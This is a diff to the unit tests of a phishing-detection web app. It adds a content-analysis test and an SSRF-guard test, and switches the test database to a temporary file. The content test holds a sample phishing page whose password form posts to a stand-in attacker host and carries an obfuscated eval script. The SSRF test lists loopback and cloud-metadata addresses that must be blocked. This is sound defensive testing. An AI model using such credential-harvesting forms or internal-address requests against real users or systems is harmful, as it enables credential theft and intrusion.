@@ -14,6 +14,7 @@ Covers:
 """
 
 import json
+import tempfile
 import unittest
 from pathlib import Path
 from app import create_app
@@ -32,10 +33,16 @@ class AdvancedResearchFeatureTests(unittest.TestCase):
     @classmethod
     def setUpClass(cls):
         cls.root = Path(__file__).resolve().parent.parent
+        cls.temp_dir = tempfile.TemporaryDirectory()
+        cls.db_path = Path(cls.temp_dir.name) / 'test_adv.sqlite3'
         model_path = cls.root / 'artifacts/detector.joblib'
         cls.detector = Detector.load(model_path) if model_path.exists() else None
-        cls.app = create_app(model=cls.detector, database=':memory:')
+        cls.app = create_app(model=cls.detector, database=cls.db_path)
         cls.client = cls.app.test_client()
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.temp_dir.cleanup()
 
     # -------------------------------------------------------------
     # 1. ADVERSARIAL EVASION ENGINE
@@ -231,6 +238,73 @@ class AdvancedResearchFeatureTests(unittest.TestCase):
         resp = self.client.post('/api/export/openioc', json={"items": [{"host": "threat.test", "risk_score": 90}]})
         self.assertEqual(resp.status_code, 200)
         self.assertIn(b"<ioc", resp.data)
+
+    # -------------------------------------------------------------
+    # 10. WEBSITE CONTENT ANALYSIS & SSRF GUARD
+    # -------------------------------------------------------------
+    def test_website_content_analysis_and_ssrf_guard(self):
+        phish_html = """
+        <html>
+          <head><title>PayPal Security Login</title></head>
+          <body oncontextmenu="return false">
+            <form action="https://evil-collector.xyz/steal" method="post">
+              <input type="password" name="pwd" />
+            </form>
+            <iframe src="https://evil-collector.xyz/frame" style="display:none"></iframe>
+            <script>eval(atob("YWxlcnQoMSk="));</script>
+          </body>
+        </html>
+        """
+        resp = self.client.post('/api/content/analyze', json={
+            "url": "https://login-check.example.com/auth",
+            "html": phish_html,
+            "fetch_live": False
+        })
+        self.assertEqual(resp.status_code, 200)
+        data = resp.get_json()
+        self.assertEqual(data['content_verdict'], 'High risk')
+        self.assertGreaterEqual(data['content_risk_score'], 65.0)
+        self.assertEqual(data['features']['password_inputs'], 1)
+        self.assertEqual(data['features']['external_form_action'], 1)
+        self.assertEqual(data['features']['title_brand_mismatch'], 1)
+
+        # SSRF protection must block loopback and private IPs
+        for blocked_url in ("http://127.0.0.1:5000/api/health", "http://localhost/admin", "http://169.254.169.254/latest"):
+            ssrf_resp = self.client.post('/api/content/analyze', json={
+                "url": blocked_url,
+                "fetch_live": True
+            })
+            self.assertEqual(ssrf_resp.status_code, 400)
+
+    # -------------------------------------------------------------
+    # 11. SUGENO FUZZY RULE VALIDATION & CONSISTENT LABELS
+    # -------------------------------------------------------------
+    def test_sugeno_rule_validation_and_consistent_labels(self):
+        from phishguard.fuzzy import validate_sugeno_rules, set_active_consequents
+
+        # Valid default rules
+        resp = self.client.get('/api/fuzzy/validate')
+        self.assertEqual(resp.status_code, 200)
+        vdata = resp.get_json()
+        self.assertTrue(vdata['valid'])
+        self.assertTrue(all(vdata['checks'].values()))
+
+        # Non-monotonic matrix must be rejected
+        bad_matrix = [[0.90, 0.50, 0.10], [0.30, 0.50, 0.75], [0.65, 0.85, 0.95]]
+        bad_resp = self.client.post('/api/fuzzy/validate', json={"consequents": bad_matrix})
+        self.assertEqual(bad_resp.status_code, 400)
+        self.assertFalse(bad_resp.get_json()['valid'])
+        with self.assertRaises(ValueError):
+            set_active_consequents(bad_matrix, "bad")
+
+        # Consistent labels and narrative explanation in /api/predict
+        pred = self.client.post('/api/predict', json={"url": "https://instagram.com"})
+        self.assertEqual(pred.status_code, 200)
+        pdata = pred.get_json()
+        self.assertIn(pdata['predicted_class'], ('Benign', 'Phishing'))
+        self.assertIn(pdata['verdict'], ('Low risk', 'Review needed', 'High risk'))
+        self.assertIn('explanation_summary', pdata)
+        self.assertIn('Sugeno inference', pdata['explanation_summary'])
 
 
 if __name__ == '__main__':
